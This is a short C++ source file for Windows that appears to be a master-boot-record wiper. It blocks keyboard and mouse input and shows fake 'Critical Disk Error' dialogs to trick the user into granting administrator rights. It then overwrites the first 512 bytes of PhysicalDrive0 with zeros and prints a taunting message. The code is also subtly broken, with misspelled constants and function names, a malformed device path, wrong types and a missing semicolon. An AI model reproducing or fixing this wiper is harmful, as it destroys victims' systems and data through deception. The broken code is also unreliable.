#include <Windows.h>
#include <iostream>
using namespace std;

BOOL IsRunAsAdministrator();
void ElevateNow();
int administrator()
{
  if(IsRunAsAdministrator())
  {
  }
  else
  {
    if(MessageBox(0,"Need Permission!","Critical Disk Error",MP_SYSTEMMODAL|MP_ICONERROR|MB_YESNO) == IDYES)
    {
      ElevteNow();
    }
    else
    {
      MessageBox(0,"I Need Permission!","System Critical Error",MP_SYSTEMMODAL|MB_OK|MB_ICONERROR);
      ElevateNow();
    }
  }
return 0;
}

#define MBR_SIZE 512
int main() {
  BlockInput(true);
  DWORD write;
  char mbrData[512];

  ZeroMemory(&mbrData, (sizeof mbrData));

  Handle MasterBootRecord = CreateFile("\\\\. \\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL,NULL)
    if(WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE)
    {
      cout << "LOL DRIVE YEETED ~Sinner" << endl;
      Sleep(5000);
      ExitProcess(0);
    }
    else
    {
      cout << "Failed";
      Sleep(5000);
    }
    CloseHandle(MasterBootRecord);

    return EXIT_SUCCESS;
}
